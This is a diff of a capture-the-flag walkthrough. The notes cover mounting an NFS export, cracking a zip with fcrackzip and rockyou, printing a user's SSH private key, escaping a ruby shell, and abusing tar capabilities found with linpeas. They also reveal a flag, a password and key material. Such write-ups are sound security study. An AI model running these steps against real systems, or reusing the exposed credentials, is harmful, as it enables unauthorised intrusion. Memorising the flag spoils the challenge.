@@ -32,18 +32,13 @@ Export list for 10.10.142.181:
 
 └─$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u chest.zip 
 
-
 PASSWORD FOUND!!!!: pw == isaaciscrazy
 
-go in a directory where is have the correct right because the right of /tmp are fuck up now cause of the mount.
+go in a directory where is have the correct right because the right of /tmp are weird now cause of the mount.
 
 unzip -P "isaaciscrazy" /tmp/
 
 cd /home/isaac/.ssh
-
-cat flag.txt : EPI{4ch13V3M3N7_7R0Phy_90lD3n_90d}
-
-cat hint.txt : 5000-6500 (some ports obviously)
 
 cat id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -95,3 +90,11 @@ RVWA4SAmsIh7/UbO6dtXNylszbJeCdE5Z3YH3eXQTci5D3jbwgMZg/Ns5VY0X329wfxWJu
 3j2l9ErGukpoi1CIXkEpBOFUKsn7daOtSbyq3AQCwcEA6AfSY+jha6CdGRstceyyPdAqeI
 xa0G3rSKDYMAAAAKaGFkZXNAaGVsbAE=
 -----END OPENSSH PRIVATE KEY-----
+
+connect on ssh as isac
+
+cat flag.txt : EPI{4ch13V3M3N7_7R0Phy_90lD3n_90d}
+
+cat hint.txt : 5000-6500 (some ports obviously)
+
+Escape from the ruby shell using system. Find that tar are setcapabilities set (found with linpeas)
